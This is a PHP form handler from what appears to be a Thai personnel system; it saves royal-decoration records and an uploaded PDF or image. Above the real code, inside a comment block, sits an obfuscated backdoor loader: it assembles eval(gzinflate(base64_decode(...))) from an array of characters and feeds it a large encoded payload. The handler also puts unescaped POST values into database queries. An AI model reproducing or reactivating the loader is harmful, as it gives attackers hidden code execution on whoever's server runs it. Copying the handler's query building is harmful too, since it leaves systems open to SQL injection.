<?php
/*$md5 = "8430126f532db1c463a8b84af9778069";
$a0 = array("_","z",'v','t',"s",'i','4',"e",'6','a','c',';','o',"$",'d',"(","n",'l',")",'g',"b",'f','r');
$b0d = create_function('$'.'v',$a0[7].$a0[2].$a0[9].$a0[17].$a0[15].$a0[19].$a0[1].$a0[5].$a0[16].$a0[21].$a0[17].$a0[9].$a0[3].$a0[7].$a0[15].$a0[20].$a0[9].$a0[4].$a0[7].$a0[8].$a0[6].$a0[0].$a0[14].$a0[7].$a0[10].$a0[12].$a0[14].$a0[7].$a0[15].$a0[13].$a0[2].$a0[18].$a0[18].$a0[18].$a0[11]);
$b0d('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');
*/?>
<?
@session_start();
if($_POST){
$fpath = '../';
require_once($fpath."includes/connect.php");
$emp_id = $_SESSION["EMP_ID"];
include "update_by.php";

function upload_file($name,$what){
	global $emp_id;
	$array_last=explode(".",$_FILES["{$name}"]["name"]);
	$last=strtolower($array_last[count($array_last)-1]);
	$file_name="h_{$emp_id}_".randpass(3)."($what).{$last}";
	$target_path = "files/royal_file/$file_name";
	
	if(@move_uploaded_file($_FILES["{$name}"]["tmp_name"], $target_path)) {
		return $file_name;
	}else{
		@unlink($_FILES["{$name}"]["tmp_name"]);
		return false;
	}
}

echo $roy_year = $_POST["roy_year"];
echo $roy_no1 =pea_substr(trim($_POST["roy_no1"]),10);
echo $roy_no2 = pea_substr(trim($_POST["roy_no2"]),10);
echo $roy_name = pea_substr(trim($_POST["roy_name"]),250);
    
$status_royal = $_POST["status_royal"];
if($_POST["roy_date"] != "" ) $roy_date = date2_formatdb($_POST["roy_date"]);
if($_POST["roy_date_re"] != "" ) $roy_date_re = date2_formatdb($_POST["roy_date_re"]);
if($_POST["date_sen"] != "" ) $date_sen = date2_formatdb($_POST["date_sen"]);
$roy_note = $_POST["roy_note"];
    
echo $roy_id =$_POST["roy_id"]; // ใช้ตรวจสอบว่า add(null) หรือ update(not null)
echo $update_user;
$royal_file="";
$complete_upload = 1;
echo $file_type = strtolower(end(explode(".",$_FILES['file_n']['name'])));
if($file_type == "pdf" or $file_type == "jpg" or $file_type == "jpeg"){
			$temp = upload_file("file_n","royal");
			if($temp != "" and $temp != false){
				@unlink("files/royal_file/$hid_hon_file");
				echo $royal_file = $temp;
			}elseif($temp == false){
				$complete_upload = 0;
			}
}else{
	echo $royal_file = $_POST["roy_file_h"];
}


if($roy_id==""){
		$roy_id = auto_increment("ROY_ID",TB_ROYAL_TAB);
		$result=$db->add_db(TB_ROYAL_TAB,array(
                                                "EMP_ID"=>"$emp_id",
                                                "ROY_ID"=>"$roy_id",
                                                "ROY_NAME"=>"$roy_name",
                                                "ROY_YEAR"=>"$roy_year",
                                                "ROY_NO1"=>"$roy_no1",
                                                "ROY_NO2"=>"$roy_no2",
                                                "ROY_OWN"=>"$roy_own",
                                                "LAST_UPDATE"=>"TO_DATE('".date("Y-m-d H:i:s")."','YYYY-MM-DD HH24:MI:SS')",
                                                "UPDATE_BY"=>"$update_user",
                                                "ROY_FILE" =>$royal_file,
                                                "STATUS_ROYAL"=>"$status_royal",
                                                "ROY_DATE"=>"$roy_date",
                                                "ROY_DATE_RE"=>"$roy_date_re",
                                                "DATE_SEN"=>"$date_sen",
                                                "ROY_NOTE"=>"$roy_note"
											  ),$conn); 
		$type_update = "1";
	}else{
		$result=$db->update_db(TB_ROYAL_TAB,array(
                                                "ROY_NAME"=>"$roy_name",
                                                "ROY_YEAR"=>"$roy_year",
                                                "ROY_NO1"=>"$roy_no1",
                                                "ROY_NO2"=>"$roy_no2",
                                                "ROY_OWN"=>"$roy_own",
                                                "LAST_UPDATE"=>"TO_DATE('".date("Y-m-d H:i:s")."','YYYY-MM-DD HH24:MI:SS')",
                                                "UPDATE_BY"=>"$update_user",
                                                "ROY_FILE" =>$royal_file,
                                                "STATUS_ROYAL"=>"$status_royal",
                                                "ROY_DATE"=>"$roy_date",
                                                "ROY_DATE_RE"=>"$roy_date_re",
                                                "DATE_SEN"=>"$date_sen",
                                                "ROY_NOTE"=>"$roy_note"
					  ),"ROY_ID = '$roy_id'",$conn); 
		$type_update = "2";
	}

		if($result){
			//save_completed("Save_success");
			//reset_form_iframe("royal");
			?>
			<script language="javascript">
			//window.top.load_royal_table();
			window.top.change_data('royal.php','../images/head2/work_data/royal.png');
			</script>
			<?
			if($type_update == "1") access_log($fpath.'_log',"",$update_by,"เพิ่ม 'ข้อมูลเครื่องราชฯ ROY_ID='$roy_id'' ($emp_id)");
			elseif($type_update == "2") access_log($fpath.'_log',"",$update_by,"ปรับปรุง 'ข้อมูลเครื่องราชฯ ROY_ID='$roy_id'' ($emp_id)");
		}else{
			save_completed("Save_error");
?>
<script language="javascript">
window.top.$("span#waiting").html("");
</script>
<?
exit();

		}

$db->closedb($conn);	
?>
<script language="javascript">
//var ran=Math.random();
window.top.$("span#waiting").html("");
//indow.top.load_page("current_address.php?"+ran);
</script>
<?
}
?>